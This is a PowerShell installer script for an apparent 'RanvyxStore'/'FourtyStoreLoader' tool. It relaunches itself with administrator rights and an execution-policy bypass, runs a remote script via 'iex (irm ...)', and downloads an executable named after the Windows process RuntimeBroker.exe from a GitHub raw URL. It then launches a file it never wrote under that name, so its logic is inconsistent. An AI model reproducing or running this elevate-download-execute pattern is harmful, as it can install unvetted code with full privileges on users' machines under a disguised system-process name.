param(
    [string]$u = 'https://raw.githubusercontent.com/lubyralph6-maker/RANVYXEXE/main/RuntimeBroker.exe',
    [string]$p = '',
    [string]$s = 'https://raw.githubusercontent.com/lubyralph6-maker/RANVYXEXE/main/RANVYXEXE.ps1'
)

$ProgressPreference = 'Continue'

if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $ue = $u.Replace("'", "''"); $pe = $p.Replace("'", "''"); $se = $s.Replace("'", "''")
    Start-Process powershell -Verb RunAs -ArgumentList "-nop -ep bypass -c `"`$u='$ue'; `$p='$pe'; iex (irm '$se')`""
    exit
}

$b = 'https://raw.githubusercontent.com/lubyralph6-maker/RANVYXEXE/main'
$t = if ($p -and (Test-Path $p)) { $p }
     elseif ($p) { New-Item -ItemType Directory -Force -Path $p | Out-Null; $p }
     else { Join-Path $env:LOCALAPPDATA 'RanvyxStore' }

New-Item -ItemType Directory -Force -Path $t, (Join-Path $t 'assets'), (Join-Path $t 'assets\fonts') | Out-Null

Get-Process FourtyStoreLoader -EA 0 | Stop-Process -Force -EA 0

$f = Join-Path $env:TEMP 'rvx.tmp'
Invoke-WebRequest $u -OutFile $f -UseBasicParsing
Copy-Item $f (Join-Path $t 'FourtyStoreLoader.exe') -Force
Remove-Item $f -Force -EA 0

@(
    @('assets/logo.png', 'logo.png'),
    @('assets/brand_banner.png', 'brand_banner.png'),
    @('assets/fonts/Kanit-Regular.ttf', 'fonts/Kanit-Regular.ttf'),
    @('assets/fonts/Kanit-Medium.ttf', 'fonts/Kanit-Medium.ttf'),
    @('assets/fonts/Kanit-SemiBold.ttf', 'fonts/Kanit-SemiBold.ttf'),
    @('assets/fonts/Kanit-Bold.ttf', 'fonts/Kanit-Bold.ttf')
) | ForEach-Object {
    $dst = Join-Path $t $_[1]
    try { Invoke-WebRequest ($b + '/' + $_[0]) -OutFile $dst -UseBasicParsing -EA Stop } catch {}
}

Start-Process (Join-Path $t 'RuntimeBroker.exe')
Write-Host 'OK'
